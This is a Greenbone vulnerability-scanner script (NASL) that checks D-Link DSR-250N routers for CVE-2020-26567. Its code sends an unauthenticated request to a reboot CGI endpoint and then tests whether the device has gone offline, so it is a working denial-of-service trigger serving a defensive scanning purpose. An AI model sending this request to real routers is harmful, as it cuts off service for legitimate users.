# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:d-link";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117076");
  script_version("2023-03-07T10:19:54+0000");
  script_tag(name:"last_modification", value:"2023-03-07 10:19:54 +0000 (Tue, 07 Mar 2023)");
  script_tag(name:"creation_date", value:"2020-12-14 11:53:42 +0000 (Mon, 14 Dec 2020)");
  script_tag(name:"cvss_base", value:"4.9");
  script_tag(name:"cvss_base_vector", value:"AV:L/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-10-19 20:02:00 +0000 (Mon, 19 Oct 2020)");

  script_cve_id("CVE-2020-26567");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DSR-250N DoS Vulnerability (CVE-2020-26567)");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_dlink_dsr_http_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("d-link/dsr/http/detected");

  script_tag(name:"summary", value:"D-Link DSR-250N devices are prone to a Denial-of-Service (DoS) vulnerability.");

  script_tag(name:"impact", value:"By sending repeated requests an attacker is able to constantly restarting the
  device making it unusable for legit users.");

  script_tag(name:"insight", value:"CGI scripts exist on the router that can be directly
  accessed with a web browser, without any authentication. In particular, the script '/scgi-bin/upgradeStatusReboot.cgi'
  executes the command to reboot the device.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the device isn't accessible
  anymore afterwards.");

  script_tag(name:"affected", value:"D-Link DSR-250N devices with firmware version 3.12 and below are known to be
  affected. Other D-Link DSR models might be affected as well.");

  script_tag(name:"solution", value:"Update to version 3.17B301C_WW or later. Please see the referenced vendor
  advisory for more information.");

  script_xref(name:"URL", value:"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10192");
  script_xref(name:"URL", value:"https://www.redteam-pentesting.de/advisories/rt-sa-2020-002");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/159516/D-Link-DSR-250N-Denial-Of-Service.html");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2020/Oct/14");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www" ) )
  exit( 0 );

port = infos["port"];
CPE = infos["cpe"];

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

if( http_is_dead( port:port ) )
  exit( 0 );

url = "/scgi-bin/upgradeStatusReboot.cgi";

req = http_get( port:port, item:url );
res = http_send_recv( port:port, data:req );
if( res && res =~ "^HTTP/1\.[01] 404" )
  exit( 99 ); # nb: On some versions the file wasn't available which might be the fix for this issue done by the vendor.

sleep( 1 );

if( http_is_dead( port:port ) ) {
  report = http_report_vuln_url( port:port, url:url ) + " (WARNING: Device will reboot if this URL is opened)";
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
